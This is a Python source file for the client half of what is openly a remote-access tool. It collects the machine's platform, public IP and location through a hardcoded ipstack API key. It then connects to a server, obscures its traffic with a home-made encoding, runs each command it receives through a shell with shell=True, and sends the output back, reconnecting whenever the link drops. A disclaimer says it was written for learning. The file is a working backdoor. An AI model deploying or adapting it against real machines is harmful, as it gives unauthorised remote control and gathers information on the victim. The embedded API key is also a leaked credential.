#!/usr/bin/python3
# -*- coding: utf-8 -*-

'''
    File name: client.py
    Author: MathIsSimple
    Python Version: 3.7.0
    Type: Build
    Build Version: 0.6b
    Disclaimer: I created this project to learn about custom encoding and python sockets,
                this projected isn't made to be used for maliscious intent. Do so at your own risk
'''

# Import core python needed modules

import sys
import time
import socket
import requests
import platform as plat

from subprocess import Popen
from subprocess import PIPE

# Global Variables

characters    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/;:.,éè'\?!&+*|`^@[]=#~-_<>(){}§\"$%µ£¤ç "
bits_per_char = len(bin(len(characters))) - 2
Connected     = False
GatheredInfo  = False
sock = None
PORT = 64500
Info = None

# Encryption Files

def modify(message):
    output = ""

    for l in message:
        index  = characters.find(l)
        index2 = len(characters) - 1 - index
        letter = characters[index2]
        output = output + letter
    
    return output

def longify(message):
    output = ""
    for char in message:
        bin_number = str(bin(characters.find(char)))[2:]
        for i in range(bits_per_char - len(bin_number)):
            bin_number = "0" + bin_number
        output = output + bin_number
    return output

def delongify(message):
    output = ""
    for i in range(int(len(message) / bits_per_char)):
        char   = int(message[i * bits_per_char:i * bits_per_char + bits_per_char], 2)
        output = output + characters[char]
    return output

def encrypt(message):
    output = modify(message)
    output = output[::-1]
    output = longify(output)
    return output

def decrypt(message):
    output = delongify(message)
    output = output[::-1]
    output = modify(output)
    return output

# Command Line Functions

def decodeCommandOutput(output):
    output = output.replace("\\", "/").replace("//", "/")
    output = output.replace("b'", "").replace('b"', "")
    output = output.replace("/r", "").replace("/n", "")
    output = output.replace("/x82", "é").replace("/x8a", "è")
    output = output.replace("/xff", " ")
    return output

def getCommandOutput(data):
    out = []
    process = Popen(data, stdout=PIPE, stderr=None, shell=True)

    while True:
        line = process.stdout.readline()
        if line != b"":
            contents = decodeCommandOutput(str(line))
            if contents.endswith("'") or contents.endswith('"'):
                contents = contents[:-1]
            
            if contents != "":
                if contents[0] == " ":
                    contents = contents[1:]
            
            out.append(contents)
        else:
            break

    out.append("END")

    return out

# Information Gathering Functions

def getInfo():
    global GatheredInfo

    platform  = "Platform : "  + plat.platform()
    system    = "System : "    + plat.system()
    ip        = "Ip : " + requests.get("https://api.ipify.org/?format=json").json()["ip"]    
    ip_info   = requests.get("http://api.ipstack.com/"+ip+"?access_key=5666d16d47c94935142e312df7c1afd1&format=1").json()
    continent = "Continent : " + str(ip_info["continent_name"])
    country   = "Country : "   + str(ip_info["country_name"])
    city      = "City : "      + str(ip_info["city"])

    GatheredInfo = True

    return   [platform, system, ip, continent, country, city, "END"]

# Socket Functions

def createSocket(HOST, PORT):
    global Connected

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
        Connected = True
    except ConnectionRefusedError:
        print("Error While Trying To Reconnect")
        print("Waiting 5s")
        time.sleep(5)

    return sock

def receiveData():
    global Connected

    if Connected == True:
        try:
            data = decrypt(sock.recv(1024).decode("utf-8", 'ignore'))
            return data
        except ConnectionResetError:
            print("Disconnected")
            Connected = False
    
    return ""

def sendData(data):
    global Connected
    global sock

    if Connected == True:
        data = encrypt(str(data))
        data = data.encode()
        sock.sendall(data)

def sendArray(data):
    global Connected

    for content in data:
        if Connected == False:
            break
        else:
            sendData(content)
            time.sleep(0.05)

def handleCommands():
    global Connected

    while True:
        if Connected == False:
            break

        data = receiveData()

        if Connected == False:
            break
        
        if data:
            if data != "END":
                print("Command : " + data)
                output = getCommandOutput(data)
                sendArray(output)
            else:
                print("Closing ...")
                sock.close()
                exit(0)

def start():
    global sock
    global Connected
    global GatheredInfo
    global PORT
    global Info

    if GatheredInfo == False:
        Info = getInfo()
        print("Gathered Info")
    
    sock = createSocket("127.0.0.1", PORT)

    if Connected:
        print("Created Connexion With Server")
        sendArray(Info)
        print("Sent Info")
        print("Handling Commands")
        handleCommands()
    
    while Connected == False:
        sock = None
        print("Attempting reconnect")
        start()

start()